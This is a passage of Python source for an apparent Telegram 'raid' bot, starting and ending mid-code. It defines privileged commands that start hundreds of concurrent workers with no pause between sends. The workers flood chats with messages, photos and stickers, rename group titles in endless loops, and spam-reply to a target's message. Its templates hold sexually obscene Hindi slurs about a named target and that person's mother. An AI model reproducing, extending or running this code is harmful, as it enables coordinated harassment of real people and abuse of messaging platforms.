    "________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝙉𝙄 𝙆𝙃𝙊𝙋𝘿𝘼 {target}⚡⚡ 𝙆𝙄 𝙈𝘼 𝙆𝘼 𝙆𝘼ʟALA 𝘽𝙃𝙊𝙎𝘿𝘼࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝙉𝙄 𝙆𝙃𝙊𝙋𝘿𝘼 {target}⚡⚡ 𝙆𝙄 𝙈𝘼 𝙆𝘼 𝙆𝘼ʟALA 𝘽𝙃𝙊𝙎𝘿𝘼࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝙉𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝙉𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 ??𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁??𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐\n________________ 𝘼𝙉𝙏𝘼𝙍 𝙈𝘼𝙉𝙏𝘼𝙍 𝙎𝙃𝘼𝙄𝙏𝘼𝐍𝐈 𝙆𝙃𝙊𝐏𝐃𝐀 {target}⚡⚡ 𝙆𝙄 𝐌𝐀 𝐊𝐀 𝐊𝐀ʟALA 𝐁𝐇𝐎𝐒𝐃𝐀࿐",
]

# ================= FAST GLOBALS =================
SUDO_USERS = set(OWNER_IDS)
global_delay = 2
spam_delay = 2
global_mode = False
MAX_THREADS = 500
current_threads = 200
bot_usernames = []
sudo_usernames = {}
setmphoto_data = {}
custom_layout = ""
LAYOUT_FILE = "layout.json"

ACTIVE_TASKS = {}
nc_tasks = {}
spam_tasks = {}
slide_tasks = {}
swipe_tasks = {}
group_tasks = {}
pfp_tasks = {}
nc_counters = {}
spam_counters = {}

react_mode = {}
dreact_mode = {}
slide_targets = set()
slidespam_targets = set()
target_names = {}
gnc_cache = {}
swipe_names = {}

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def transform_nc_target(text):
    return text.upper()


def load_data():
    global SUDO_USERS, sudo_usernames, custom_layout
    if os.path.exists(SUDO_FILE):
        try:
            with open(SUDO_FILE, "r") as f:
                data = json.load(f)
                if isinstance(data, list):
                    SUDO_USERS.update(data)
                elif isinstance(data, dict):
                    SUDO_USERS.update([int(k) for k in data.keys()])
                    sudo_usernames.update(data)
        except:
            pass
    if os.path.exists("sudo_names.json"):
        try:
            with open("sudo_names.json", "r") as f:
                sudo_usernames.update(json.load(f))
        except:
            pass
    for uid in SUDO_USERS:
        if str(uid) not in sudo_usernames:
            sudo_usernames[str(uid)] = "User_" + str(uid)
    if os.path.exists(LAYOUT_FILE):
        try:
            with open(LAYOUT_FILE, "r") as f:
                custom_layout = json.load(f).get("layout", "")
        except:
            pass


def save_sudo():
    with open(SUDO_FILE, "w") as f:
        json.dump(list(SUDO_USERS), f)
    with open("sudo_names.json", "w") as f:
        json.dump(sudo_usernames, f)


SLAVES_FILE = "slaves.json"
slaves_list = []


def load_slaves():
    global slaves_list
    if os.path.exists(SLAVES_FILE):
        try:
            with open(SLAVES_FILE, "r") as f:
                data = json.load(f)
            migrated = []
            for item in data:
                if isinstance(item, str):
                    migrated.append({"name": item, "videos": []})
                else:
                    migrated.append(item)
            slaves_list = migrated
        except:
            slaves_list = []


def save_slaves():
    with open(SLAVES_FILE, "w") as f:
        json.dump(slaves_list, f)


# ================= DECORATOR =================
def only_sudo(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in SUDO_USERS:
            await update.message.reply_text(UNAUTHORIZED_MESSAGE)
            return
        return await func(update, context, *args, **kwargs)
    return wrapper


# ================= STOP HELPERS =================
def _stop_dict(chat_id, d):
    if chat_id in d:
        for t in d[chat_id]:
            try: t.cancel()
            except: pass
        del d[chat_id]
        return True
    return False


def stop_all_for_chat(chat_id, task_type=None):
    stopped = False
    if task_type is None or task_type == "nc":
        if _stop_dict(chat_id, nc_tasks): stopped = True
        if _stop_dict(chat_id, group_tasks): stopped = True
    if task_type is None or task_type == "spam":
        if _stop_dict(chat_id, spam_tasks): stopped = True
    if task_type is None or task_type == "slide":
        if _stop_dict(chat_id, slide_tasks): stopped = True
    if task_type is None or task_type == "swipe":
        if _stop_dict(chat_id, swipe_tasks): stopped = True
    if task_type is None or task_type == "pfp":
        if _stop_dict(chat_id, pfp_tasks): stopped = True
    if task_type is None:
        react_mode.pop(chat_id, None)
        dreact_mode.pop(chat_id, None)
        ACTIVE_TASKS.pop(chat_id, None)
    return stopped


# ================= ULTRA FAST WORKERS (zero sleep between sends) =================

async def nc_title_worker(bot, chat_id, base_text, pattern_fn):
    idx = random.randint(0, 100000)
    while True:
        try:
            text = pattern_fn(base_text, idx)
            await bot.set_chat_title(chat_id, text)
            nc_counters[chat_id] = nc_counters.get(chat_id, 0) + 1
            idx += 1
            await asyncio.sleep(0)
        except asyncio.CancelledError:
            break
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after)
        except:
            await asyncio.sleep(0)


async def spam_worker(bot, chat_id, text_fn):
    idx = 0
    while True:
        try:
            msg = text_fn(idx) if callable(text_fn) else text_fn
            await bot.send_message(chat_id, msg)
            spam_counters[chat_id] = spam_counters.get(chat_id, 0) + 1
            idx += 1
            await asyncio.sleep(0)
        except asyncio.CancelledError:
            break
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after)
        except:
            await asyncio.sleep(0)


async def slide_worker(bot, chat_id, target_msg_id, target_name, messages, delete_after=False):
    idx = 0
    while True:
        try:
            msg = messages[idx % len(messages)].format(target=target_name)
            sent = await bot.send_message(chat_id, msg, reply_to_message_id=target_msg_id)
            if delete_after:
                await asyncio.sleep(0.15)
                try: await bot.delete_message(chat_id, sent.message_id)
                except: pass
            idx += 1
            await asyncio.sleep(0)
        except asyncio.CancelledError:
            break
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after)
        except:
            await asyncio.sleep(0)


async def swipe_worker(bot, chat_id, target_msg_id, name):
    while True:
        try:
            msg = f"{name} {random.choice(RAID_TEXTS)}"
            await bot.send_message(chat_id, msg, reply_to_message_id=target_msg_id)
            await asyncio.sleep(0)
        except asyncio.CancelledError:
            break
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after)
        except:
            await asyncio.sleep(0)


async def image_spam_worker(bot, chat_id, photo_id):
    while True:
        try:
            await bot.send_photo(chat_id, photo=photo_id)
            await asyncio.sleep(0)
        except asyncio.CancelledError:
            break
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after)
        except:
            await asyncio.sleep(0)


async def sticker_spam_worker(bot, chat_id, sticker_id):
    while True:
        try:
            await bot.send_sticker(chat_id, sticker_id)
            await asyncio.sleep(0)
        except asyncio.CancelledError:
            break
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after)
        except:
            await asyncio.sleep(0)


async def photo_msg_worker(bot, chat_id, photo_id, caption):
    while True:
        try:
            await bot.send_photo(chat_id, photo=photo_id, caption=caption if caption else None)
            await asyncio.sleep(0)
        except asyncio.CancelledError:
            break
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after)
        except:
            await asyncio.sleep(0)


async def sequence_spam_worker(bot, chat_id, hater_name):
    idx = 0
    active = [t for t in SPAM_TEMPLATE if t and t.strip()]
    if not active:
        return
    while True:
        try:
            template = active[idx % len(active)]
            msg = template.replace("{hater}", hater_name).replace("{target}", hater_name)
            await bot.send_message(chat_id, msg)
            idx += 1
            await asyncio.sleep(0)
        except asyncio.CancelledError:
            break
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after)
        except:
            await asyncio.sleep(0)


# ================= PATTERN FUNCTIONS (keep all original words) =================

GOJO_NC1_EMOJIS = ["🥱","😱","🤨","😒","😡","🤬","😤","😮‍💨","🥵","🥶","🤢","🤮","😈","👿","👽","🧃","🧋","🗻","🃏","💠","🔥","💀","👾","✨","⚡","🌊","🌋","🪐","🌈","❄️","🌀"]
GOJO_NC1_WORDS = [
    "𝙏𝘽𝙆𝘽 ✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧🎀✧",
    "𝙏𝘽𝙆𝘽 ✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧👑✧",
    "𝙏𝘽𝙆𝘽 ✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧👾✧",
    "𝙏𝘽𝙆𝘽 ✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧💀✧",
    "𝙏𝘽𝙆𝘽 ✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧🔥✧",
    "𝙏𝘽𝙆𝘽 ✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧⚡✧",
]
GOJO_NC1_PATTERN = "𓏲 ๋࣭ ࣪ ˖ {emoji} 𓂃 ࣪˖ {target} {word} 𓏲 ๋࣭   ࣪ ˖ {emoji} 𓂃 ࣪˖"

def make_nc1(base, idx):
    return GOJO_NC1_PATTERN.format(target=transform_nc_target(base),
        word=GOJO_NC1_WORDS[idx % len(GOJO_NC1_WORDS)],
        emoji=GOJO_NC1_EMOJIS[idx % len(GOJO_NC1_EMOJIS)])


GOJO_NC2_EMOJIS = ["❤️","🧡","💛","💚","💙","💜","🖤","🤍","🤎","💔","❤️‍🔥","❤️‍🩹","❣️","💕","💞","💓","💗","💖","💘","💝"]
GOJO_NC2_WORDS = [
    "𝗠ᴀᴅᴇʀᴄʜᴏᴅ", "𝗕ᴇᴛɪᴄʜᴏᴅ", "𝗕ʜᴀɴᴄʜᴏᴅ", "𝗧ᴍʀ", "𝗧ᴍᴋᴄ",
    "𝗦ᴀʟᴀ", "𝗛ᴀʀᴀᴍɪ", "𝗚ᴀɴᴅᴜ", "𝗖ʜᴜᴛɪʏᴀ", "𝗟ᴀᴜᴅᴇ",
    "𝗦ᴜᴀʀ", "𝗞ᴜᴛᴛᴀ", "𝗛ɪᴊᴅᴀ", "𝗕ʜᴏᴏᴛ", "𝗡ɪᴋᴀᴍᴍᴀ",
    "𝗕ᴀᴅᴛᴀᴍᴇᴇᴢ", "𝗣ᴀᴛᴛʜᴀʀ", "𝗖ʜᴀʀꜱɪ", "𝗕ʜᴀɪɴꜱ"
]
GOJO_NC2_PATTERN = "『{emoji}』 {target} {word} 『{emoji}』"

def make_nc2(base, idx):
    return GOJO_NC2_PATTERN.format(target=transform_nc_target(base),
        word=GOJO_NC2_WORDS[idx % len(GOJO_NC2_WORDS)],
        emoji=GOJO_NC2_EMOJIS[idx % len(GOJO_NC2_EMOJIS)])


GOJO_NC3_EMOJIS = ["🚀","🌈","🔥","💢","🧃","🛸","🪨","🎀","🌊","🪐","👑","🌋","👾","🤮","💀","☠️","🦴","🐍","🐉","🍕"]
GOJO_NC3_WORDS = [
    "🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀🚀𝗠ᴀᴅᴇʀᴄʜᴏᴅ",
    "🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈🌈𝗕ᴇᴛɪᴄʜᴏᴅ",
    "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥𝗕ʜᴀɴᴄʜᴏᴅ",
    "💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢💢𝗧ᴍʀ",
    "🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃🧃𝗧ᴍᴋᴄ",
]
GOJO_NC3_PATTERN = "⟬{emoji}⟭ {target} {word} ⟬{emoji}⟭"

def make_nc3(base, idx):
    return GOJO_NC3_PATTERN.format(target=transform_nc_target(base),
        word=GOJO_NC3_WORDS[idx % len(GOJO_NC3_WORDS)],
        emoji=GOJO_NC3_EMOJIS[idx % len(GOJO_NC3_EMOJIS)])


GOJO_NC4_EMOJIS = ["🇮🇳","🇵🇰","🇦🇫","🇺🇸","🇬🇧","🇨🇦","🇦🇺","🇩🇪","🇫🇷","🇮🇹","🇯🇵","🇰🇷","🇧🇷","🇷🇺","🇿🇦","🇲🇽","🇪🇸","🇸🇦","🇹🇷","🇮🇩"]
GOJO_NC4_WORDS = [
    "TᗴᖇI ᗰᗩᗩ TOᕼ ᑕᕼOᑕᒪᗩTᗴ ᗰᗴ ᕼI ᑕᕼᑌᗪᑎᗴ Kᗴ ᒪIYᗴ ᗰᗩᗩᑎ ᒍᗩTI 💀",
    "TᗴᖇI ᗰᗩᗩ TOᕼ ᑕᕼOᑕᒪᗩTᗴ ᗰᗴ ᕼI ᑕᕼᑌᗪᑎᗴ Kᗴ ᒪIYᗴ ᗰᗩᗩᑎ ᒍᗩTI 👹",
    "TᗴᖇI ᗰᗩᗩ TOᕼ ᑕᕼOᑕᒪᗩTᗴ ᗰᗴ ᕼI ᑕᕼᑌᗪᑎᗴ Kᗴ ᒪIYᗴ ᗰᗩᗩᑎ ᒍᗩTI 🤡",
    "TᗴᖇI ᗰᗩᗩ TOᕼ ᑕᕼOᑕᒪᗩTᗴ ᗰᗴ ᕼI ᑕᕼᑌᗪᑎᗴ Kᗴ ᒪIYᗴ ᗰᗩᗩᑎ ᒍᗩTI 👻",
    "TᗴᖇI ᗰᗩᗩ TOᕼ ᑕᕼOᑕᒪᗩTᗴ ᗰᗴ ᕼI ᑕᕼᑌᗪᑎᗴ Kᗴ ᒪIYᗴ ᗰᗩᗩᑎ ᒍᗩTI ☠️",
]
GOJO_NC4_PATTERN = "𓆩{emoji}𓆪 {target} {word} 𓆩{emoji}𓆪"

def make_nc4(base, idx):
    return GOJO_NC4_PATTERN.format(target=transform_nc_target(base),
        word=GOJO_NC4_WORDS[idx % len(GOJO_NC4_WORDS)],
        emoji=GOJO_NC4_EMOJIS[idx % len(GOJO_NC4_EMOJIS)])


GOJO_NC5_EMOJIS = ["🌟","💫","✨","🌈","🦋","🌸","🎀","🕊️","🌺","🌷","🌠","☄️","👾","💢","🕸️","🗿","💸","🔮","📿","🚬"]
GOJO_NC5_WORDS = [
    "𒈙⸻🩵𒈙⸻❤️𒈙⸻🩷𒈙⸻🧡𒈙⸻💛𒈙⸻💚𒈙⸻💙𒈙⸻💜𒈙⸻🖤𒈙⸻🩶𒈙⸻🤍𒈙⸻ 𒈙⸻🩵𒈙⸻❤️𒈙⸻🩷𒈙⸻🧡𒈙⸻💛𒈙⸻💚𒈙⸻💙𒈙⸻💜",
    "𝙈𝙐𝙅𝙃𝙀 𝙆𝙐𝘾𝙃 𝙉𝙄 𝙋𝘼𝙏𝘼 𝘾𝙃𝙐𝘿𝙀𝙂𝙄 𝙏𝙃𝙊 𝙏𝙀𝙍𝙄 𝙈𝘼𝘼 𝙃𝙄 𓍯𓍯🍌𓍯𓍯🍌𓍯𓍯🍌𓍯𓍯🍌𓍯𓍯🍌𓍯𓍯🍌𓍯𓍯🍌𓍯𓍯🍌𓍯𓍯 𝗧ᴍᴋᴄ",
]
GOJO_NC5_PATTERN = "{emoji}  {target}  {word}  {emoji}"

def make_nc5(base, idx):
    return GOJO_NC5_PATTERN.format(target=transform_nc_target(base),
        word=GOJO_NC5_WORDS[idx % len(GOJO_NC5_WORDS)],
        emoji=GOJO_NC5_EMOJIS[idx % len(GOJO_NC5_EMOJIS)])


def make_nc9(base, idx):
    return NC9_PATTERN.format(target=transform_nc_target(base),
        word=NC9_WORDS[idx % len(NC9_WORDS)],
        emoji=NC9_EMOJIS[idx % len(NC9_EMOJIS)])


def make_speed(base, idx):   return f"{base} {random.choice(EXONC_TEXTS + NCEMO_EMOJIS)}"
def make_flag(base, idx):    return f"{base} {random.choice(FLAGNC_EMOJIS)}"
def make_heart(base, idx):   return f"{base} {random.choice(HEARTNC_EMOJIS)}"
def make_aesthetic(base, idx):
    e1 = random.choice(AESTHETICNC_EMOJIS); e2 = random.choice(AESTHETICNC_EMOJIS)
    return f"{base} ⋆.𐙚 ̊{e1}{e2}"
def make_veg(base, idx):     return f"{base} {random.choice(VEGETABLENC_EMOJIS)}"
def make_animal(base, idx):  return f"{base} {random.choice(ANIMALNC_EMOJIS)}"
def make_time(base, idx):    return f"{base}╰┈➤{time.strftime('%S:%M:%H')}"

GNC_PREFIXES = [
    "🌈₊˚🎀⊹♡🌻✨","👑⋆˚࿔⚡︎𖤐🔥","☠︎︎⋆༒︎𖤐⛧⚚","𓂃˚✦₊˚𓆩♡𓆪","⚡︎⋆𖤐☠︎︎👑🔥",
    "🎮⋆👾🎧⚡︎🕹️","𓂀☥𓋹𓁈𓆣","💀⃤༒︎𖤐⚚⛧","☁️⋆｡˚🕊️✨♡","🦋⃤♡⃤🌙✧☁️",
    "🔱⚡︎𖤐👑⛧","🌊⋆🐚𓇼✨🫧","🩸༒︎☠︎︎⚚𖤓",
]
GNC_SUFFIXES = [
    "જ⁀➴ 👑 ⁀➴ ⚡︎ ⁀➴ 👑 ⁀➴ ✨ ⁀➴ 🔥 ⁀➴ 👑જ⁀➴ 👑 ⁀➴ ⚡︎ ⁀➴ 👑 ⁀➴ ✨ ⁀➴ 🔥 ⁀➴ 👑",
    "⋆🌷🫧💭₊˚ෆִ໋🌷͙֒₊˚*ੈ♡⸝⸝🪐༘⋆‧₊˚🖇️✩ ₊˚🎧⊹♡𓍢ִ໋🌷֒✧ ༘ ⋆｡♡ପ꒰˶•༝ •˶꒱ଓ 🌸🤍",
    "𓊆ྀི🤍𓊇ྀི(っ҂° ཀ•)っ🕊️⊹˚.·:*¨༺ ☣ ༻¨*:·✃𓄧꒷꒦🎀𓊆ྀི🤍𓊇ྀི",
    "𓂃 ࣪˖ ִֶָ🐇་༘࿐⋆⭒˚.⋆🪐 ⋆⭒˚.⋆ִֶָ. ..𓂃 ࣪ ִֶָ🦋་༘࿐°❀⋆.ೃ࿔*:･",
    "⚡︎🌃𓍙.ೃ࿔*:･⁺‧₊˚ ཐི⋆♱⋆ཋྀ ˚₊‧⁺°🥂⋆.ೃ🍾࿔*:･ོ༘₊⁺☀︎₊⁺⋆.˚~.*🍋 ྀིྀི",
    "ೀ⋅⁀➴🌻✨જ⁀➴.⋅˚🎀⊹♡₊‧🌻✨🎀⊹♡ೀ⋅⁀➴🌻✨જ⁀➴.⋅˚🎀⊹♡₊‧🌻✨🎀⊹♡",
    "𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹𓂀 ☥ 𓋹 𓁈 𓆣 𓂀 ☥ 𓋹 𓁈 𓆣",
]
def make_king(base, idx):
    return f"{random.choice(GNC_PREFIXES)} {base} {random.choice(GNC_SUFFIXES)}"

GNC_STYLES = {
    "king":      (1,  0,  "👑 Kɪɴɢ 𝐍ᴄ"),
    "aesthetic": (3,  3,  "✨ Aᴇꜱᴛʜᴇᴛɪᴄ 𝐍ᴄ"),
    "dark":      (2,  2,  "☠️ Dᴀʀᴋ 𝐍ᴄ"),
    "cute":      (0,  1,  "🌈 Cᴜᴛᴇ 𝐍ᴄ"),
    "neon":      (4,  4,  "⚡ Nᴇᴏɴ 𝐍ᴄ"),
    "gamer":     (5,  5,  "🎮 Gᴀᴍᴇʀ 𝐍ᴄ"),
    "mythic":    (6,  6,  "🔱 Mʏᴛʜɪᴄ 𝐍ᴄ"),
    "glitch":    (7,  7,  "💀 Gʟɪᴛᴄʜ 𝐍ᴄ"),
    "soft":      (9,  9,  "🦋 Sᴏꜰᴛ 𝐍ᴄ"),
    "crown":     (10, 10, "🔥 Cʀᴏᴡɴ 𝐍ᴄ"),
}
_GNC_STYLE_ORDER = ["king", "aesthetic", "dark", "cute", "neon", "gamer", "mythic", "glitch", "soft", "crown"]

def _gnc_keyboard(uid):
    keyboard = []
    for i in range(0, len(_GNC_STYLE_ORDER), 2):
        row = []
        for key in _GNC_STYLE_ORDER[i:i+2]:
            row.append(InlineKeyboardButton(GNC_STYLES[key][2], callback_data=f"gnc_{uid}_{key}"))
        keyboard.append(row)
    return InlineKeyboardMarkup(keyboard)

def _gnc_format(text, style_key):
    pi, si, _ = GNC_STYLES[style_key]
    return f"{GNC_PREFIXES[pi % len(GNC_PREFIXES)]} {text} {GNC_SUFFIXES[si % len(GNC_SUFFIXES)]}"


# ================= GOJO NC COMMANDS =================

def _start_nc(update, base, pattern_fn, label):
    chat_id = update.message.chat_id
    stop_all_for_chat(chat_id, "nc")
    tasks = [asyncio.create_task(nc_title_worker(bot, chat_id, base, pattern_fn)) for bot in bots]
    nc_tasks[chat_id] = tasks
    ACTIVE_TASKS[chat_id] = {"type": "nc", "tasks": tasks}
    return tasks

@only_sudo
async def gojospeed_cmd(u, c):
    base = " ".join(c.args or []) or ALL_NC_TEXT
    _start_nc(u, base, make_speed, "speed")
    await u.message.reply_text("🔥 𝐆𝐎𝐉𝐎 𝐒𝐏𝐄𝐄𝐃 𝐎𝐍!")

@only_sudo
async def gojoflag_cmd(u, c):
    base = " ".join(c.args or []) or ALL_NC_TEXT
    _start_nc(u, base, make_flag, "flag")
    await u.message.reply_text("🇮🇳 𝐆𝐎𝐉𝐎 𝐅𝐋𝐀𝐆 𝐎𝐍!")

@only_sudo
async def gojoheart_cmd(u, c):
    base = " ".join(c.args or []) or ALL_NC_TEXT
    _start_nc(u, base, make_heart, "heart")
    await u.message.reply_text("❤️ 𝐆𝐎𝐉𝐎 𝐇𝐄𝐀𝐑𝐓 𝐎𝐍!")

@only_sudo
async def gojoaesthetic_cmd(u, c):
    base = " ".join(c.args or []) or ALL_NC_TEXT
    _start_nc(u, base, make_aesthetic, "aesthetic")
    await u.message.reply_text("🌸 𝐆𝐎𝐉𝐎 𝐀𝐄𝐒𝐓𝐇𝐄𝐓𝐈𝐂 𝐎𝐍!")

@only_sudo
async def gojovegetable_cmd(u, c):
    base = " ".join(c.args or []) or ALL_NC_TEXT
    _start_nc(u, base, make_veg, "veg")
    await u.message.reply_text("🥬 𝐆𝐎𝐉𝐎 𝐕𝐄𝐆𝐄𝐓𝐀𝐁𝐋𝐄 𝐎𝐍!")

@only_sudo
async def gojoanimal_cmd(u, c):
    base = " ".join(c.args or []) or ALL_NC_TEXT
    _start_nc(u, base, make_animal, "animal")
    await u.message.reply_text("🐶 𝐆𝐎𝐉𝐎 𝐀𝐍𝐈𝐌𝐀𝐋 𝐎𝐍!")

@only_sudo
async def gojotime_cmd(u, c):
    base = " ".join(c.args) or "Test"
    _start_nc(u, base, make_time, "time")
    await u.message.reply_text("⏰ 𝐆𝐎𝐉𝐎 𝐓𝐈𝐌𝐄 𝐎𝐍!")

@only_sudo
async def gojoking_cmd(u, c):
    base = " ".join(c.args or []) or ALL_NC_TEXT
    _start_nc(u, base, make_king, "king")
    await u.message.reply_text("✨ 𝐆𝐎𝐉𝐎 𝐊𝐈𝐍𝐆 𝐎𝐍!")

@only_sudo
async def gojonc1_cmd(u, c):
    if not c.args: return await u.message.reply_text("⚠️ Usage: /gojonc1 <text>")
    base = " ".join(c.args)
    _start_nc(u, base, make_nc1, "nc1")
    await u.message.reply_text(f"✅ GOJO NC1 STARTED: {base}\n⚡ ULTRA SPEED")

@only_sudo
async def gojonc2_cmd(u, c):
    if not c.args: return await u.message.reply_text("⚠️ Usage: /gojonc2 <text>")
    base = " ".join(c.args)
    _start_nc(u, base, make_nc2, "nc2")
    await u.message.reply_text(f"✅ GOJO NC2 STARTED: {base}\n⚡ ULTRA SPEED")

@only_sudo
async def gojonc3_cmd(u, c):
    if not c.args: return await u.message.reply_text("⚠️ Usage: /gojonc3 <text>")
    base = " ".join(c.args)
    _start_nc(u, base, make_nc3, "nc3")
    await u.message.reply_text(f"✅ GOJO NC3 STARTED: {base}\n⚡ ULTRA SPEED")

@only_sudo
async def gojonc4_cmd(u, c):
    if not c.args: return await u.message.reply_text("⚠️ Usage: /gojonc4 <text>")
    base = " ".join(c.args)
    _start_nc(u, base, make_nc4, "nc4")
